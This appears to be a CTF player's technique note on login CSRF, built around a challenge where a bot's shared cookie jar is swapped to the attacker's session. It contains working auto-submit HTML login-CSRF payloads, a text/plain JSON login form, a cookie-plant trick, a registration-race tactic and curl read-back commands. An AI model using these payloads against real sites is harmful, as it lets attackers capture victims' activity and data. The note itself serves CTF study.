# Login CSRF and the credential-plant write — the SSOS shape

A login-CSRF doesn't write data — it writes a CREDENTIAL. The form
logs the victim into the ATTACKER's account. Everything the victim
does next lands on the attacker's account: their deposits, their
activity, their flag-submissions.

---

## 1. The primitive

```text
a login form is itself CSRF-able — it's a state-changing POST with
credentials in the body and a Set-Cookie in the response. the
browser processes the Set-Cookie — the victim's session cookie
becomes the attacker's.
```

The login endpoint is the perfect CSRF target: it takes a username
+ password (data you supply, not a secret you lack) and it SETS a
credential cookie. The write's "state change" is the session swap.

## 2. The classic login-CSRF page

```html
<form id="f" action="https://target/login" method="POST">
  <input name="username" value="attacker">
  <input name="password" value="attackerpass">
</form>
<script>document.getElementById('f').submit()</script>
<!-- the victim is now logged in as 'attacker' — their next actions
     (a deposit, a flag-submit, a profile write) land on YOUR account -->
```

Then the attacker's own session reads what the victim deposited.

## 3. The JSON login — text/plain shape

```html
<form action="https://sso/login" method="POST" enctype="text/plain">
  <input name='{"user":"me","pass":"x","i":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
<!-- {"user":"me","pass":"x","i":"="} — the text/plain JSON login -->
```

The SSOS card's exact shape — the SSO login takes JSON, the form
ships it via text/plain, and the `Set-Cookie` lands in the shared jar.

## 4. The shared-cookie-jar amplification — the SSOS card

```text
the bot's browser holds a PERSISTENT cookie jar across visits:
1. a registration race — register the bot's fixed account name first
   → the bot's own login fails or maps to your account
2. the CSRF page's login POST → Set-Cookie: token=<your-session>
   lands in the SHARED jar — overwrites whatever was there
3. the bot's loginSSO step IGNORES its credential arguments — it
   authorizes from the jar's token cookie → now it's YOUR session
4. the bot submits the flag to YOUR account's assignment
```

The jar-persistence is the primitive — a cookie set in visit N is
still there for visit N+1. The login-CSRF writes your credential
into the jar; the next bot action runs as you.

## 5. The credential-swap read-back

```bash
# confirm the swap: read YOUR account for the victim's deposit
curl -s -b "$ATTACKER_CJ" "$BASE/api/me" | grep -o 'flag\|deposit\|assignment'
curl -s -b "$ATTACKER_CJ" "$BASE/api/flag" | grep -oE 'HTB\{[^}]+\}'
```

The flag/secret appears on the ATTACKER's account — the readback
is your own session, not the victim's.

## 6. The "who owns the session after the swap" cases

| Shape | The outcome |
|---|---|
| victim logs into attacker's account | victim's writes land on your account |
| victim's cookie replaced by yours | victim acts as you; you read their actions |
| a shared jar across bot visits | the swap persists across bot cycles |
| the bot's login reads the jar | the bot runs as you after the swap |

## 7. The registration-race pairing

```text
when the bot's account name is FIXED and registration is open:
- register the name first → the bot's login fails → it falls back
  to a default/your-account session
- OR the registration race: submit the registration at the same
  moment the bot does → the bot's session maps to your record
```

The login-CSRF alone swaps to your account; the race pairs it with
forcing the bot onto a controlled session.

## 8. The double-submit-cookie plant — a cookie-write CSRF

```text
when the CSRF defense is a double-submit cookie (cookie value ==
form value), a cookie-PLANT makes them match:
- a subdomain cookie-set: <img src="https://sub.target/set-cookie?csrf=x">
- a header-injection cookie-set
- a cookie-bombing overflow that forces the value
then the CSRF form's csrf=x matches the planted cookie → validates
```

The login-CSRF generalizes: any endpoint that SETS a cookie the
defense reads can be CSRF'd to plant it.

## 9. The OAuth/SSO login — the flow-level CSRF

```text
an OAuth/SSO login is itself CSRF-able when the state/nonce isn't
session-bound:
- /authorize?client_id=...&redirect_uri=...&state=X — a login-CSRF
  starts a flow for the attacker's account in the victim's browser
- the callback's code gets bound to whichever session is current —
  a missing SameSite or a shared jar swaps it
```

The SSOS card is the OAuth/SSO variant — the login function reads
the cookie jar, not the credentials you send.

## 10. The falsifier

```text
the login endpoint requires a token the attacker can't read, OR
the cookie jar doesn't persist, OR SameSite=Strict blocks the
cross-site Set-Cookie — the credential-swap fails. check whether
the Set-Cookie from a cross-origin POST actually lands (SameSite
on the RESPONSE cookie governs a cross-site set too — Lax/Strict
on the session cookie blocks the cross-site SET landing).
```

## 11. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "login-csrf: text/plain JSON login swaps the shared token cookie"
```
